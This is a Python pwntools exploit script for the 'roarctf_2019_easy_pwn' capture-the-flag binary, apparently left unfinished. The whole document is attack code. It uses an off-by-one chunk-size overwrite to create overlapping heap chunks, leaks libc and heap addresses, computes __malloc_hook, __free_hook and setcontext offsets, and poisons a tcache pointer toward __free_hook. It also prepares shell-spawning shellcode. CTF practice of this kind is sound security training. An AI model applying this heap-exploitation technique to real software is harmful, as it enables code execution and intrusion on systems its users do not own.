from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
rc=lambda x:p.recv(x)
rl=lambda :p.recvline()
ru=lambda x:p.recvuntil(x)
ita=lambda :p.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		gdb.attach(p,x)
		pause()

p=process("./roarctf_2019_easy_pwn")
elf=ELF("./roarctf_2019_easy_pwn")

def create(size):
    sla(b"choice: ",b"1")
    sla(b"size: ",str(size).encode())
def write(index,size,con):
    sla(b"choice: ",b"2")
    sla(b"index: ",str(index).encode())
    sla(b'size: ',str(size).encode())
    sa(b"content: ",con)
def delete(index):
    sla(b"choice: ",b"3")
    sla(b"index: ",str(index).encode())
def show(index):
    sla(b"choice: ",b"4")
    sla(b"index: ",str(index).encode())

for i in range(7):
    create(0xb0)
create(0xb8)#7
create(0x30)#8
create(0x30)#9
create(0x30)#10
create(0x30)#11
create(0x10)#12
for i in range(7):
    delete(i)

write(7,0xb8+10,b'a'*0xb8+p8(0xc1))
delete(8)
# write(7,0xb8+10,b'a'*0xb8+p8(0xf1))
create(0x50)#0
# create(0x30)#1
# show(1)
# p.recvuntil(b"content: ")
# print(p.recv())
show(9)
ru(b'content: ')
rc(0x20)
libc_addr=u64(rc(6).ljust(8,b'\x00'))
print("libc_addr",hex(libc_addr))
malloc_hook=libc_addr-0x70
libc_base=malloc_hook-libc.sym['__malloc_hook']
print("libc_base",hex(libc_base))
print("malloc_hook",hex(malloc_hook))
free_hook=libc_base+libc.sym['__free_hook']
print("free_hook",hex(free_hook))
setcontext=malloc_hook+0x197c50
print("setcontext",hex(setcontext))

create(0x28)
write(0,0x40,0x38*b'a'+p64(0x31))

delete(1)
delete(9)
show(0)

ru(b'content: ')
rc(0x48)
heap_addr=u64(rc(6).ljust(8,b'\x00'))
print("heap_addr",hex(heap_addr))

write(0,0x48,0x38*b'a'+p64(0x31)+p64(free_hook))
create(0xb8)
create(0x28)
gdba()
p.interactive()